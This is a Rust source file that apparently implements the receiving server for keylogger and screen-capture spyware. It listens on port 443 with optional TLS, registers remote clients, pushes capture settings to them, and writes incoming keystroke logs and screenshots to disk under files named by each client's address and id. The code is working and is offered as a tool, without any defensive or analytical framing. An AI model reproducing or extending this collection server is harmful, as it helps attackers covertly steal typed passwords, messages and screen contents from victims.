use std::net::{UdpSocket, TcpListener, TcpStream};
use openssl::ssl::{Ssl, SslMethod, SslAcceptor, SslFiletype, SslStream, SslContext};
use std::sync::{Arc, Mutex};
use std::convert::TryInto;
use std::fs::File;
use std::io::{Read, Write};
use std::fmt::Debug;
use rand::Rng;
use std::collections::HashMap;
use crate::pool::Pool;

const THREADS_MAX: usize = 12;
const SIGNAL_SIZE: usize = 4;
const LOCAL_PORT: i32 = 443;
const SYN_SIZE: usize = 8;

pub enum FileType {Keys, Screens}
pub enum ClientState { UnInit, Ready, Dead }
pub enum SocketType { TLSEncap((String, String)), NoTls } // will selfsigned work?
pub enum CompressionQuality { Best, Good, Default, Low }

impl CompressionQuality {
    fn value(&self) -> i32 {
        match *self {
            CompressionQuality::Best => 60,
            CompressionQuality::Good => 55,
            CompressionQuality::Default => 50,
            CompressionQuality::Low => 45
        }
    }
}

pub struct ServerConfig {
    pub socket_type: Option<SocketType>,
    pub pool_size: Option<usize>,
    pub frame_time: Option<i32>,
    pub compression_quality: Option<CompressionQuality>
}

/*
--  TCP Signals --
    ServerSynAck,
    ReadKeysAck,
    ReadScreenAck,
    ReadMetaAck,
    Continue,
    Unknown
--              -- 
*/


pub struct TLSSocketServer {
    addr: String,
    listener: TcpListener,
    pool: Pool,
    acceptor: SslAcceptor,
    config: ServerConfig,
    clients: HashMap<i32, StickyClient>
}

impl TLSSocketServer {
    pub fn init(config: ServerConfig) -> Result<TLSSocketServer, ServerConfig> {
        let pool = {
            match config.pool_size {
                Some(s) => Pool::new(s),
                None => Pool::new(THREADS_MAX)
            }
        };
        let mut addr = {
            match try_get_default_addr() {
                Some(s) => s,
                None => unimplemented!()
            }
        };
        addr = format!("{}:{}", addr, LOCAL_PORT);
        let acceptor = match config.socket_type {
            Some(ref socket_type) => {
                match socket_type {
                    SocketType::TLSEncap((key, cert)) => {
                        let mut acceptor = SslAcceptor::mozilla_intermediate(
                            SslMethod::tls()
                        ).unwrap();
                        acceptor.set_private_key_file(&key, SslFiletype::PEM).unwrap();
                        acceptor.set_certificate_chain_file(&cert).unwrap();
                        acceptor.check_private_key().unwrap();
                        acceptor.build()
                    },
                    SocketType::NoTls => { return Err(config) }
                }
            },
            None => { return Err(config) }
        };
        let listener = match TcpListener::bind(&addr) {
            Ok(l) => l,
            Err(_) => panic!("Run me as sudo please! <3")
        };
        Ok( TLSSocketServer {
            addr: addr,
            pool: pool,
            listener: listener,
            acceptor: acceptor,
            config: config,
            clients: HashMap::new()
        })
    }

    pub fn run(&mut self) { self.keep_alive(); }
}

pub struct TCPSocketServer {
    addr: String,
    listener: TcpListener,
    pool: Pool,
    config: ServerConfig,
    clients: HashMap<i32, StickyClient>
}

impl TCPSocketServer {
    // we don't need two types for the server because the underlying socket is the same
    // only needs an optional acceptor for accepting TLS streams
    pub fn init(config: ServerConfig) -> TCPSocketServer {
        let pool = {
            match config.pool_size {
                Some(s) => Pool::new(s),
                None => Pool::new(THREADS_MAX)
            }
        };
        let mut addr = {
            match try_get_default_addr() {
                Some(s) => s,
                None => String::from("0.0.0.0")
            }
        };
        addr = format!("{}:{}", addr, LOCAL_PORT);
        let listener = match TcpListener::bind(&addr) {
            Ok(l) => l,
            Err(_) => panic!("Run me as sudo please! <3")
        };
        return TCPSocketServer {
            addr: addr,
            pool: pool,
            listener: listener,
            config: config,
            clients: HashMap::new()
        }
    }

    pub fn run(&mut self) { self.keep_alive(); }
}

pub enum StreamState { RequiresInit, Continue, Stopped }

pub trait MoveStream<T: Read + Write, U: Debug> {
    fn do_move(&mut self) -> Result<T, U>;
}

impl MoveStream<TcpStream, std::io::Error> for TcpStream {
    fn do_move(&mut self) -> Result<TcpStream, std::io::Error> 
    { self.try_clone() }
}

impl MoveStream<SslStream<TcpStream>, openssl::error::ErrorStack> for SslStream<TcpStream> {
    fn do_move(&mut self) -> Result<SslStream<TcpStream>, openssl::error::ErrorStack> {
        let builder = SslContext::builder(
            SslMethod::tls_server()
        ).unwrap();
        let ctx = builder.build();
        let ssl = Ssl::new(&ctx).unwrap();
        let stream = self.get_mut().try_clone().unwrap();
        SslStream::new(ssl, stream)
    }
}

pub trait HandleStream {
    fn keep_alive(&mut self);

    fn gen_client_id(&self) -> i32 {
        let n: i32 = rand::thread_rng().gen(); n
    }

    fn run_non_blocking<T: 'static, U>(
        &self,
        sock: &mut T,
        idx: i128,
        id: i32,
        state: StreamState,
        client: StickyClient
    ) -> Arc<Mutex<StreamState>>
    where
        U: Debug,
        T: Read + Write + Send + MoveStream<T, U>;

    fn init_client<T>(config: &ServerConfig, stream: &mut T) -> ClientState 
    where T: Read + Write
    {
        let mut res = Vec::new();
        res.extend(
            &config
                .frame_time
                .unwrap_or(1000i32)
                .to_be_bytes()
        );
        let compression: i32 = { match &config.compression_quality {
            Some(comp) => comp.value(),
            None => 44i32
        }};
        res.extend(&compression.to_be_bytes());
        stream.write(&res).unwrap();
        let mut sig_arr = [0u8; SIGNAL_SIZE];
        stream.read(&mut sig_arr).unwrap();
        match i32::from_be_bytes(sig_arr) {
            1 => ClientState::UnInit,
            2 => ClientState::Ready,
            _ => ClientState::Dead
        }
    }

    fn run_complete_file<T>(
        file_type: FileType,
        stream: &mut T,
        size: i32,
        suffix: &str
    )
        where T: Read + Write
    {
        let mut file = {
            match file_type {
                FileType::Keys => {
                    File::create(
                        format!("keystrokes_{}.txt", suffix)
                    ).unwrap()
                },
                FileType::Screens => {
                    File::create(
                        format!("screenshot_{}.jpg", suffix)
                    ).unwrap()
                }
            }
        };
        let mut buf = [0u8; 8];
        let mut remaining = size.clone();
        while remaining != 0 {
            let n = stream.read(&mut buf).unwrap();
            remaining = remaining - n as i32;
            match file_type {
                FileType::Keys => 
                    { 
                        file.write(
                            &std::str::from_utf8(&buf)
                                .unwrap()
                                .as_bytes()
                        ).unwrap();
                    },
                FileType::Screens => { file.write(&buf).unwrap(); }
            }
        }
        stream.write(&1i32.to_be_bytes()).unwrap(); // client continue
    }

    fn handle_stream<T>(
        stream: &mut T,
        i: i128, 
        client: Option<&StickyClient>
    ) -> StreamState
    where T: Read + Write 
    {
        let mut in_buf = [0u8; SYN_SIZE];
        stream.read(&mut in_buf).unwrap();
        let (sig, data) = {
            let (a, b) = in_buf.split_at(4);
            let left: [u8; 4] = a.try_into().unwrap();
            let right: [u8; 4] = b.try_into().unwrap();
            (i32::from_be_bytes(left), i32::from_be_bytes(right))
        };
        match sig {
            1 => { println!("initializing client"); StreamState::RequiresInit },
            4 => { println!("client stopping"); StreamState::Stopped },
            5 => { // StartSendKeys
                println!("writing client keys!");
                stream.write(&5i32.to_be_bytes()).unwrap();
                Self::run_complete_file(
                    FileType::Keys,
                    stream,
                    data,
                    &client.unwrap().get_file_suffix(i)
                );
                StreamState::Continue
            },
            6 => { // StartSendScreens
                println!("writing client screenshot!");
                stream.write(&6i32.to_be_bytes()).unwrap();
                Self::run_complete_file(
                    FileType::Screens,
                    stream,
                    data,
                    &client.unwrap().get_file_suffix(i)
                );
                StreamState::Continue
            },
            _ => { StreamState::Continue }
        }
    }
}

impl HandleStream for TCPSocketServer {
    fn run_non_blocking<T: 'static, U>(
        &self,
        sock: &mut T,
        idx: i128,
        id: i32,
        state: StreamState,
        client: StickyClient
    ) -> Arc<Mutex<StreamState>>
    where
        U: Debug,
        T: Read + Write + Send + MoveStream<T, U>
    {
        let state_protected = Arc::new(Mutex::new(state));
        let state_clone = state_protected.clone();
        let mut stream_clone = sock.do_move().unwrap();
        let mut i = idx.clone();
        self.pool.execute(move || {
            loop {
                let state = Self::handle_stream(
                    &mut stream_clone,
                    i,
                    Some(&client)
                );
                match state {
                    StreamState::Continue => {},
                    _ => {
                        let mut lock = state_clone.lock().unwrap();
                        *lock = state; break;
                    }
                }
                i = i + 1i128;
            }
        });
        state_protected
    }

    fn keep_alive(&mut self) {
        let mut i = 1i128;
        loop { for mut stream in self.listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    i = i + 1i128;
                    match Self::handle_stream(&mut stream, i, None) {
                        StreamState::Continue => {},
                        StreamState::RequiresInit => {
                            match Self::init_client(
                                &self.config,
                                &mut stream)
                            {
                                ClientState::UnInit | ClientState::Dead => {},
                                ClientState::Ready => {
                                    let remote_addr = stream.peer_addr().unwrap().to_string();
                                    let key = self.gen_client_id();
                                    let state = Arc::new(Mutex::new(StreamState::Continue));
                                    let client = StickyClient {
                                        remote_addr: remote_addr,
                                        id: key,
                                        state: state
                                    };
                                    self.clients.insert(key.clone(), client.clone());
                                    let state = self.run_non_blocking(
                                        &mut stream,
                                        i.clone(),
                                        key.clone(),
                                        StreamState::Continue,
                                        client
                                    );
                                }
                            }
                        }, 
                        StreamState::Stopped => {}
                    }
                }
                Err(_) => { /* connection failed */ }
            }
        }}
    }

}

impl HandleStream for TLSSocketServer {
    fn run_non_blocking<T: 'static, U>(
        &self,
        sock: &mut T,
        idx: i128,
        id: i32,
        state: StreamState,
        client: StickyClient
    ) -> Arc<Mutex<StreamState>>
    where
        U: Debug,
        T: Read + Write + Send + MoveStream<T, U>
    {
        let state_protected = Arc::new(Mutex::new(state));
        let state_clone = state_protected.clone();
        let mut stream_clone = sock.do_move().unwrap();
        let mut i = idx.clone();
        self.pool.execute(move || {
            loop {
                let state = Self::handle_stream(
                    &mut stream_clone,
                    i,
                    Some(&client)
                );
                match state {
                    StreamState::Continue => {},
                    _ => {
                        let mut lock = state_clone.lock().unwrap();
                        *lock = state; break;
                    }
                }
                i = i + 1i128;
            }
        });
        state_protected
    }

    fn keep_alive(&mut self) {
        let mut i = 1i128;
        loop { for mut stream in self.listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    i = i + 1i128;
                    let mut stream_ = self.acceptor.accept(stream).unwrap();
                    match Self::handle_stream(&mut stream_, i, None) {
                        StreamState::Continue => {},
                        StreamState::RequiresInit => {
                            match Self::init_client(
                                &self.config,
                                &mut stream_)
                            {
                                ClientState::UnInit | ClientState::Dead => {},
                                ClientState::Ready => {
                                    let remote_addr = stream_
                                        .get_ref()
                                        .peer_addr()
                                        .unwrap()
                                        .to_string();
                                    let key = self.gen_client_id();
                                    let state = Arc::new(Mutex::new(StreamState::Continue));
                                    let client = StickyClient {
                                        remote_addr: remote_addr,
                                        id: key,
                                        state: state
                                    };
                                    self.clients.insert(key.clone(), client.clone());
                                    let state = self.run_non_blocking(
                                        &mut stream_,
                                        i.clone(),
                                        key.clone(),
                                        StreamState::Continue,
                                        client
                                    );
                                }
                            }
                        }, 
                        StreamState::Stopped => {}
                    }
                }
                Err(_) => { /* connection failed */ }
            }
        }}
    }
}

pub struct StickyClient {
    remote_addr: String,
    id: i32,
    state: Arc<Mutex<StreamState>>
}

impl StickyClient {
    fn get_file_suffix(&self, suffix: i128) -> String {
        format!("{}_{}_{}", self.remote_addr, self.id, suffix)
    }
    fn clone(&self) -> StickyClient {
        StickyClient {
            remote_addr: self.remote_addr.clone(),
            id: self.id.clone(),
            state: self.state.clone()
        }
    }
}

fn try_get_default_addr() -> Option<String> {
	let socket = match UdpSocket::bind("0.0.0.0:0") {
		Ok(s) => s,
		Err(_) => return None,
	};

	match socket.connect("8.8.8.8:80") {
		Ok(()) => (),
		Err(_) => return None,
	};

	match socket.local_addr() {
		Ok(addr) => return Some(addr.ip().to_string()),
		Err(_) => return None,
	};
}